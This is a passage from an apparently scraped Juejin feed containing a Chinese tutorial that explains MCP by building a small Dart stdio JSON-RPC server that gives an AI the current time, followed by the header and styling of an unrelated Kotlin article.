.hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7f51c2cf7f444182b09071101b2b9241~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=1024&amp;h=559&amp;s=404732&amp;e=png&amp;b=042359" alt="" loading="lazy"/></p>
<blockquote>
<p>纸上学来终觉浅，绝知此事要躬行</p>
</blockquote>
<p>了解事物最好的方式，就是自己去做些什么。作为一名 Flutter 开发工程师，当我们谈论 MCP（Model Context Protocol）时，不妨从一个简单的时间服务开始，看看这个协议如何在实际开发中发挥作用。</p>
<p>在 AI 快速发展的今天，我们见证了无数工具的诞生，但它们之间的协作往往充满摩擦。每个工具都有自己的接口规范，AI 需要为每个工具学习不同的"语言"。这种碎片化的现状，正是 MCP 要解决的核心问题。</p>
<hr/>
<h4 data-id="heading-0">1.直观体验 MCP 是作用</h4>
<p>MCP（Model Context Protocol）本质上是一种<strong>标准化的通信协议</strong>，它定义了 AI 模型与外部工具之间的交互方式。就像 HTTP 协议规范了浏览器与服务器的通信一样，MCP 规范了 AI 与各种服务的对话规则。这里就不说多说那些废话的大道理，直接从实际场景，介绍 MCP 的价值。<br/>
比如说，如果没有 MCP 时，让 AI 处理这个内容：</p>
<blockquote>
<p>帮我查看一下这篇文章的内容 <a href="https://juejin.cn/post/7588004601392529442" target="_blank" title="https://juejin.cn/post/7588004601392529442">juejin.cn/post/758800…</a></p>
</blockquote>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/73294ab11ee940758c5222af517161b4~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=1160&amp;h=488&amp;s=113293&amp;e=png&amp;b=272727" alt="" loading="lazy"/></p>
<p>就会得到 <code>我无法直接访问外部网站链接来查看文章内容</code>, 明明它有个很强的脑子，但是就像是没有眼睛一样，看不到网页里的东西，岂不可惜。</p>
<hr/>
<p>如果工具一旦接入 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.browsermcp.io%2Fsetup-server" target="_blank" title="https://docs.browsermcp.io/setup-server" ref="nofollow noopener noreferrer">browsermcp</a> 的 MCP 服务, 它就能 <strong>看见</strong> 网页。同理，内置的文件访问、搜索等工具也是类似，这样工具们就可以调度大脑，思考网站、写入文件，让整个流程畅通起来。</p>
<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ef21343822f44212926a19ba8d5e2b40~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=1177&amp;h=728&amp;s=135073&amp;e=png&amp;b=272727" alt="" loading="lazy"/></p>
<blockquote>
<p>如果说 AI 是一个强大的大脑，那么 MCP 就是眼睛、手、脚。让 AI 能看、能做。</p>
</blockquote>
<hr/>
<h4 data-id="heading-1">2.从时间服务看协议本质</h4>
<p>理解 MCP 最好的方式，就是动手写一个服务。我们从最简单的时间服务开始，看看这个协议如何工作。
如果什么都没有的时候，问 AI <code>现在什么时候</code>, 你将得到一个它自认为的错误时间：</p>
<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/dda07d1dece04d6d93203629b8d3cb88~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=750&amp;h=188&amp;s=14864&amp;e=png&amp;b=272727" alt="" loading="lazy"/></p>
<p>我们本文要做的，是基于 Dart 语言，搭建一个可以理解当前时间的 MCP 服务，让 AI 可以在需要时，调用 Dart 的服务，得到本机的精确时间，如下所示:</p>
<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/265f445bc3a1490f9d7ac07ee247627f~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=767&amp;h=321&amp;s=27724&amp;e=png&amp;b=262626" alt="" loading="lazy"/></p>
<p>项目结构很简单：</p>
<pre><code class="hljs language-python" lang="python">now/
├── <span class="hljs-built_in">bin</span>/
│   └── server.dart          <span class="hljs-comment"># 主服务器文件</span>
├── pubspec.yaml             <span class="hljs-comment"># Dart 项目配置</span>
├── mcp-config.json          <span class="hljs-comment"># MCP 服务配置</span>
└── README.md               <span class="hljs-comment"># 项目说明</span>
</code></pre>
<hr/>
<h4 data-id="heading-2">3.协议的三个核心阶段</h4>
<p>MCP 服务有明确的生命周期，每个阶段都有特定的职责。</p>
<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3f375f74254e4992a614d2278c26d795~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=1200&amp;h=722&amp;s=50467&amp;e=png&amp;b=fff9f9" alt="" loading="lazy"/></p>
<p><strong>初始化阶段</strong> - 协议握手</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">case</span> <span class="hljs-string">'initialize'</span>:
  <span class="hljs-keyword">return</span> {
    <span class="hljs-string">'jsonrpc'</span>: <span class="hljs-string">'2.0'</span>,
    <span class="hljs-string">'result'</span>: {
      <span class="hljs-string">'protocolVersion'</span>: <span class="hljs-string">'2024-11-05'</span>,
      <span class="hljs-string">'capabilities'</span>: {
        <span class="hljs-string">'tools'</span>: {}  <span class="hljs-comment">// 声明支持工具调用</span>
      },
      <span class="hljs-string">'serverInfo'</span>: {
        <span class="hljs-string">'name'</span>: <span class="hljs-string">'now-server'</span>,
        <span class="hljs-string">'version'</span>: <span class="hljs-string">'1.0.0'</span>
      }
    },
    <span class="hljs-string">'id'</span>: id
  };
</code></pre>
<p>这个阶段确保客户端和服务端使用兼容的协议版本，就像两个人见面先确认说的是同一种语言。</p>
<p><strong>工具发现阶段</strong> - 能力声明</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">case</span> <span class="hljs-string">'tools/list'</span>:
  <span class="hljs-keyword">return</span> {
    <span class="hljs-string">'jsonrpc'</span>: <span class="hljs-string">'2.0'</span>,
    <span class="hljs-string">'result'</span>: {
      <span class="hljs-string">'tools'</span>: [
        {
          <span class="hljs-string">'name'</span>: <span class="hljs-string">'get_current_time'</span>,
          <span class="hljs-string">'description'</span>: <span class="hljs-string">'Get the current date and time'</span>,
          <span class="hljs-string">'inputSchema'</span>: {
            <span class="hljs-string">'type'</span>: <span class="hljs-string">'object'</span>,
            <span class="hljs-string">'properties'</span>: {
              <span class="hljs-string">'format'</span>: {
                <span class="hljs-string">'type'</span>: <span class="hljs-string">'string'</span>,
                <span class="hljs-string">'description'</span>: <span class="hljs-string">'Time format (iso, local, utc)'</span>,
                <span class="hljs-string">'default'</span>: <span class="hljs-string">'iso'</span>
              }
            },
            <span class="hljs-string">'additionalProperties'</span>: <span class="hljs-keyword">false</span>
          }
        }
      ]
    },
    <span class="hljs-string">'id'</span>: id
  };
</code></pre>
<p>这里用 JSON Schema 描述工具的接口。AI 通过这个描述就知道如何调用工具，不需要额外的文档说明。</p>
<p><strong>工具执行阶段</strong> - 实际工作</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">case</span> <span class="hljs-string">'tools/call'</span>:
  <span class="hljs-keyword">final</span> toolName = params[<span class="hljs-string">'name'</span>] <span class="hljs-keyword">as</span> <span class="hljs-built_in">String?</span>;
  <span class="hljs-keyword">final</span> arguments = params[<span class="hljs-string">'arguments'</span>] <span class="hljs-keyword">as</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;? ?? {};

  <span class="hljs-keyword">if</span> (toolName == <span class="hljs-string">'get_current_time'</span>) {
    <span class="hljs-keyword">return</span> handleGetCurrentTime(arguments, id);
  }

  <span class="hljs-keyword">return</span> {
    <span class="hljs-string">'jsonrpc'</span>: <span class="hljs-string">'2.0'</span>,
    <span class="hljs-string">'error'</span>: {
      <span class="hljs-string">'code'</span>: <span class="hljs-number">-32601</span>,
      <span class="hljs-string">'message'</span>: <span class="hljs-string">'Tool not found: <span class="hljs-subst">$toolName</span>'</span>
    },
    <span class="hljs-string">'id'</span>: id
  };
</code></pre>
<hr/>
<h4 data-id="heading-3">4.通信机制的核心</h4>
<p>MCP 建立在 JSON-RPC 2.0 之上，基于 stdio 通信。服务器监听 stdin，通过 stdout 响应：</p>
<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/70772526f1d642ea9493726e7a13244a~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=1249&amp;h=265&amp;s=27398&amp;e=png&amp;b=fefdfd" alt="" loading="lazy"/></p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">void</span> main() {
  stdin
      .transform(utf8.decoder)
      .transform(LineSplitter())
      .listen((line) {
    <span class="hljs-keyword">if</span> (line.trim().isEmpty) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">final</span> request = jsonDecode(line);
      <span class="hljs-keyword">final</span> response = handleRequest(request);
      <span class="hljs-keyword">if</span> (response != <span class="hljs-keyword">null</span>) {
        stdout.writeln(jsonEncode(response));
        stdout.flush();
      }
    } <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-keyword">final</span> errorResponse = {
        <span class="hljs-string">'jsonrpc'</span>: <span class="hljs-string">'2.0'</span>,
        <span class="hljs-string">'error'</span>: {
          <span class="hljs-string">'code'</span>: <span class="hljs-number">-32700</span>,
          <span class="hljs-string">'message'</span>: <span class="hljs-string">'Parse error'</span>
        },
        <span class="hljs-string">'id'</span>: <span class="hljs-keyword">null</span>
      };
      stdout.writeln(jsonEncode(errorResponse));
      stdout.flush();
    }
  });
}
</code></pre>
<p>这种方式跨平台兼容性好，进程隔离天然安全，调试和测试容易。可以直接运行 dart 项目，输入 <code> {"jsonrpc":"2.0","id":1,"method":"initialize"}</code> 来测试服务是否正常响应：</p>
<blockquote>
<p>命令行: dart .\bin\server.dart<br/>
输入:  {"jsonrpc":"2.0","id":1,"method":"initialize"}<br/>
输出: {"jsonrpc":"2.0","result":{"protocolVersion":"2024-11-05","capabilities":{"tools":{}},"serverInfo":{"name":"now-server","version":"1.0.0"}},"id":1}</p>
</blockquote>
<hr/>
<h4 data-id="heading-4">5.协议设计的智慧</h4>
<p>MCP 的设计体现了几个重要的软件工程原则：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/be9435ed8314445686c8b366aa429fcb~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=1208&amp;h=652&amp;s=72603&amp;e=png&amp;b=ffffff" alt="" loading="lazy"/></p>
<p><strong>约定优于配置</strong> - 统一的协议减少了集成的复杂性<br/>
<strong>最小惊讶原则</strong> - 协议的每个部分都遵循直觉，没有意外的行为<br/>
<strong>关注点分离</strong> - 协议层面只关心通信格式，业务逻辑由工具实现者决定</p>
<p>这种标准化的力量，就像建筑行业的标准化螺丝。看起来简单，但却让整个行业的协作变得高效。一个 MCP 服务不是孤立的存在。AI 可以协调使用 MCP 工具，联合处理任务, 比如:</p>
<blockquote>
<p>将当前时间写到文章开头</p>
</blockquote>
<p>此时 AI 大脑就可以调度获取当前时间的 MCP，然后调度写入文件的能力，完成实际的功能。让一个文章可以自动填入当前时间：</p>
<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b105b3561bb940ae8f20c9c2da0d51df~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=1988&amp;h=797&amp;s=304535&amp;e=png&amp;b=252525" alt="" loading="lazy"/></p>
<hr/>
<h4 data-id="heading-5">结语</h4>
<p>MCP 不仅仅是一个技术协议，它代表了 AI 时代工具集成的新思路。通过标准化的接口，我们能够构建更加开放、可扩展的 AI 生态系统。</p>
<p>对于 Flutter 开发者而言，掌握 MCP 意味着能够为 AI 提供移动端的各种能力，从设备信息获取到本地数据处理，都可以通过这种标准化的方式暴露给 AI 使用。</p>
<p>从这个简单的时间服务开始，我们看到了协议设计的智慧、实现的细节、扩展的可能性。这种从简单到复杂、从具体到抽象的学习路径，正是技术成长的最佳方式。</p>
<p>技术的本质不在于复杂性，而在于解决问题的优雅程度。MCP 用简洁的协议解决了复杂的集成问题，这就是技术的魅力：简单的协议，无限的可能。</p>
<p>当我们站在 AI 时代的门槛上，掌握 MCP 这样的基础协议，就像掌握了一把钥匙，能够打开通往未来的大门。</p>
<hr/>
<p>更多文章和视频知识资讯，大家可以关注我的公众号、掘金和 B 站 。让我们一起成长，变得更强。我们下次再见~</p>
<ul>
<li>QQ交流群： 1046304516</li>
<li>掘金账号： <a href="https://juejin.cn/user/149189281194766" title="https://juejin.cn/user/149189281194766" target="_blank">张风捷特烈</a></li>
<li>bilibli 账号： <a href="https://link.juejin.cn/?target=https%3A%2F%2Fspace.bilibili.com%2F390457600" title="https://link.juejin.cn/?target=https%3A%2F%2Fspace.bilibili.com%2F390457600" target="_blank">张风捷特烈</a></li>
<li>公众号： <a href="https://link.juejin.cn/?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fq8Vs5i3SU-4QPoU3-0xOSg" title="https://link.juejin.cn/?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fq8Vs5i3SU-4QPoU3-0xOSg" target="_blank">编程之王</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[告别 Kotlin 中臃肿的 when 表达式]]></title>    <link>https://juejin.cn/post/7591330139083735055</link>    <guid>https://juejin.cn/post/7591330139083735055</guid>    <pubDate>2026-01-05T00:46:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591330139083735055" data-draft-id="7587253759092654116" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="告别 Kotlin 中臃肿的 when 表达式"/> <meta itemprop="keywords" content="Kotlin,Android"/> <meta itemprop="datePublished" content="2026-01-05T00:46:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="RockByte"/> <meta itemprop="url" content="https://juejin.cn/user/1046390797768519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            告别 Kotlin 中臃肿的 when 表达式
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1046390797768519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    RockByte
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-05T00:46:53.000Z" title="Mon Jan 05 2026 00:46:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body .octicon{display:inline-block;fill:currentColor;vertical-align:text-bottom}.markdown-body .anchor{float:left;line-height:1;margin-left:-20px;padding-right:4px}.markdown-body .anchor:focus{outline:none}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{color:#1b1f23;vertical-align:middle;visibility:hidden}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{visibility:visible}.markdown-body h1:hover .anchor .octicon-link:before,.markdown-body h2:hover .anchor .octicon-link:before,.markdown-body h3:hover .anchor .octicon-link:before,.markdown-body h4:hover .anchor .octicon-link:before,.markdown-body h5:hover .anchor .octicon-link:before,.markdown-body h6:hover .anchor .octicon-link:before{width:16px;height:16px;content:" ";display:inline-block;background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' aria-hidden='true'%3E%3Cpath fill-rule='evenodd' d='M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z'/%3E%3C/svg%3E")}.markdown-body{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;color:#24292e;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:16px;line-height:1.5;word-wrap:break-word}.markdown-body details{display:block}.markdown-body summary{display:list-item}.markdown-body a{background-color:initial}.markdown-body a:active,.markdown-body a:hover{outline-width:0}.markdown-body strong{font-weight:inherit;font-weight:bolder}.markdown-body h1{margin:.67em 0}.markdown-body img{border-style:none}.markdown-body code,.markdown-body kbd,.markdown-body pre{font-family:monospace,monospace;font-size:1em}.markdown-body hr{box-sizing:initial;overflow:visible}.markdown-body input{font:inherit;margin:0;overflow:visible}.markdown-body [type=checkbox]{box-sizing:border-box;padding:0}.markdown-body *{box-sizing:border-box}.markdown-body input{font-family:inherit;font-size:inherit;line-height:inherit}.markdown-body a{color:#0366d6;text-decoration:none}.markdown-body a:hover{text-decoration:underline}.markdown-body strong{font-weight:600}.markdown-body hr{height:0;margin:15px 0;overflow:hidden;background:transparent;border-bottom:1px solid #dfe2e5}.markdown-body hr:after,.markdown-body hr:before{display:table;content:""}.markdown-body hr:after{clear:both}.markdown-body table{border-spacing:0;border-collapse:collapse}.markdown-body td,.markdown-body th{padding:0}.markdown-body details summary{cursor:pointer}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:0;margin-bottom:0}.markdown-body h1{font-size:32px}.markdown-body h1,.markdown-body h2{font-weight:600}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:20px}.markdown-body h3,.markdown-body h4{font-weight:600}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:14px}.markdown-body h5,.markdown-body h6{font-weight:600}.markdown-body h6{font-size:12px}.markdown-body p{margin-top:0;margin-bottom:10px}.markdown-body blockquote{margin:0}.markdown-body ol,.markdown-body ul{padding-left:0;margin-top:0;margin-bottom:0}.markdown-body ol ol,.markdown-body ul ol{list-style-type:lower-roman}.markdown-body ol ol ol,.markdown-body ol ul ol,.markdown-body ul ol ol,.markdown-body ul ul ol{list-style-type:lower-alpha}.markdown-body dd{margin-left:0}.markdown-body code,.markdown-body pre{font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px}.markdown-body pre{margin-top:0;margin-bottom:0}.markdown-body input::-webkit-inner-spin-button,.markdown-body input::-webkit-outer-spin-button{margin:0;-webkit-appearance:none;appearance:none}.markdown-body :checked+.radio-label{position:relative;z-index:1;border-color:#0366d6}.markdown-body .border{border:1px solid #e1e4e8!important}.markdown-body .border-0{border:0!important}.markdown-body .border-bottom{border-bottom:1px solid #e1e4e8!important}.markdown-body .rounded-1{border-radius:3px!important}.markdown-body .bg-white{background-color:#fff!important}.markdown-body .bg-gray-light{background-color:#fafbfc!important}.markdown-body .text-gray-light{color:#6a737d!important}.markdown-body .pl-3,.markdown-body .px-3{padding-left:16px!important}.markdown-body .px-3{padding-right:16px!important}.markdown-body .f6{font-size:12px!important}.markdown-body .lh-condensed{line-height:1.25!important}.markdown-body .text-bold{font-weight:600!important}.markdown-body .pl-c{color:#6a737d}.markdown-body .pl-c1,.markdown-body .pl-s .pl-v{color:#005cc5}.markdown-body .pl-e,.markdown-body .pl-en{color:#6f42c1}.markdown-body .pl-s .pl-s1,.markdown-body .pl-smi{color:#24292e}.markdown-body .pl-ent{color:#22863a}.markdown-body .pl-k{color:#d73a49}.markdown-body .pl-pds,.markdown-body .pl-s,.markdown-body .pl-s .pl-pse .pl-s1,.markdown-body .pl-sr,.markdown-body .pl-sr .pl-cce,.markdown-body .pl-sr .pl-sra,.markdown-body .pl-sr .pl-sre{color:#032f62}.markdown-body .pl-smw,.markdown-body .pl-v{color:#e36209}.markdown-body .pl-bu{color:#b31d28}.markdown-body .pl-ii{color:#fafbfc;background-color:#b31d28}.markdown-body .pl-c2{color:#fafbfc;background-color:#d73a49}.markdown-body .pl-c2:before{content:"^M"}.markdown-body .pl-sr .pl-cce{font-weight:700;color:#22863a}.markdown-body .pl-ml{color:#735c0f}.markdown-body .pl-mh,.markdown-body .pl-mh .pl-en,.markdown-body .pl-ms{font-weight:700;color:#005cc5}.markdown-body .pl-mi{font-style:italic;color:#24292e}.markdown-body .pl-mb{font-weight:700;color:#24292e}.markdown-body .pl-md{color:#b31d28;background-color:#ffeef0}.markdown-body .pl-mi1{color:#22863a;background-color:#f0fff4}.markdown-body .pl-mc{color:#e36209;background-color:#ffebda}.markdown-body .pl-mi2{color:#f6f8fa;background-color:#005cc5}.markdown-body .pl-mdr{font-weight:700;color:#6f42c1}.markdown-body .pl-ba{color:#586069}.markdown-body .pl-sg{color:#959da5}.markdown-body .pl-corl{text-decoration:underline;color:#032f62}.markdown-body .mb-0{margin-bottom:0!important}.markdown-body .my-2{margin-bottom:8px!important;margin-top:8px!important}.markdown-body .pl-0{padding-left:0!important}.markdown-body .py-0{padding-top:0!important;padding-bottom:0!important}.markdown-body .pl-1{padding-left:4px!important}.markdown-body .pl-2{padding-left:8px!important}.markdown-body .py-2{padding-top:8px!important;padding-bottom:8px!important}.markdown-body .pl-3{padding-left:16px!important}.markdown-body .pl-4{padding-left:24px!important}.markdown-body .pl-5{padding-left:32px!important}.markdown-body .pl-6{padding-left:40px!important}.markdown-body .pl-7{padding-left:48px!important}.markdown-body .pl-8{padding-left:64px!important}.markdown-body .pl-9{padding-left:80px!important}.markdown-body .pl-10{padding-left:96px!important}.markdown-body .pl-11{padding-left:112px!important}.markdown-body .pl-12{padding-left:128px!important}.markdown-body hr{border-bottom-color:#eee}.markdown-body kbd{display:inline-block;padding:3px 5px;font:11px SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;line-height:10px;color:#444d56;vertical-align:middle;background-color:#fafbfc;border:1px solid #d1d5da;border-radius:3px;box-shadow:inset 0 -1px 0 #d1d5da}.markdown-body:after,.markdown-body:before{display:table;content:""}.markdown-body:after{clear:both}.markdown-body&gt;:first-child{margin-top:0!important}.markdown-body&gt;:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body blockquote,.markdown-body details,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:16px}.markdown-body hr{height:.25em;padding:0;margin:24px 0;background-color:#e1e4e8;border:0}.markdown-body blockquote{padding:0 1em;color:#6a737d;border-left:.25em solid #dfe2e5}.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:24px;margin-bottom:16px;font-weight:600;line-height:1.25}.markdown-body h1{font-size:2em}.markdown-body h1,.markdown-body h2{padding-bottom:.3em;border-bottom:1px solid #eaecef}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{font-size:.85em;color:#6a737d}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body li{word-wrap:break-all}.markdown-body li&gt;p{margin-top:16px}.markdown-body li+li{margin-top:.25em}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:600}.markdown-body dl dd{padding:0 16px;margin-bottom:16px}.markdown-body table{display:block;width:100%;overflow:auto}.markdown-body table th{font-weight:600}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #dfe2e5}.markdown-body table tr{background-color:#fff;border-top:1px solid #c6cbd1}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}.markdown-body img{max-width:100%;box-sizing:initial;background-color:#fff}.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body code{padding:.2em .4em;margin:0;font-size:85%;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body pre{word-wrap:normal}.markdown-body pre&gt;code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:transparent;border:0}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body .highlight pre,.markdown-body pre{padding:16px;overflow:auto;font-size:85%;line-height:1.45;background-color:#f6f8fa;border-radius:3px}.markdown-body pre code{display:inline;max-width:auto;padding:0;margin:0;overflow:visible;line-height:inherit;word-wrap:normal;background-color:initial;border:0}.markdown-body .commit-tease-sha{display:inline-block;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:90%;color:#444d56}.markdown-body .full-commit .btn-outline:not(:disabled):hover{color:#005cc5;border-color:#005cc5}.markdown-body .blob-wrapper{overflow-x:auto;overflow-y:hidden}.markdown-body .blob-wrapper-embedded{max-height:240px;overflow-y:auto}.markdown-body .blob-num{width:1%;min-width:50px;padding-right:10px;padding-left:10px;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;line-height:20px;color:rgba(27,31,35,.3);text-align:right;white-space:nowrap;vertical-align:top;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-body .blob-num:hover{color:rgba(27,31,35,.6)}.markdown-body .blob-num:before{content:attr(data-line-number)}.markdown-body .blob-code{position:relative;padding-right:10px;padding-left:10px;line-height:20px;vertical-align:top}.markdown-body .blob-code-inner{overflow:visible;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;color:#24292e;word-wrap:normal;white-space:pre}.markdown-body .pl-token.active,.markdown-body .pl-token:hover{cursor:pointer;background:#ffea7f}.markdown-body .tab-size[data-tab-size="1"]{-moz-tab-size:1;tab-size:1}.markdown-body .tab-size[data-tab-size="2"]{-moz-tab-size:2;tab-size:2}.markdown-body .tab-size[data-tab-size="3"]{-moz-tab-size:3;tab-size:3}.markdown-body .tab-size[data-tab-size="4"]{-moz-tab-size:4;tab-size:4}.markdown-body .tab-size[data-tab-size="5"]{-moz-tab-size:5;tab-size:5}.markdown-body .tab-size[data-tab-size="6"]{-moz-tab-size:6;tab-size:6}.markdown-body .tab-size[data-tab-size="7"]{-moz-tab-size:7;tab-size:7}.markdown-body 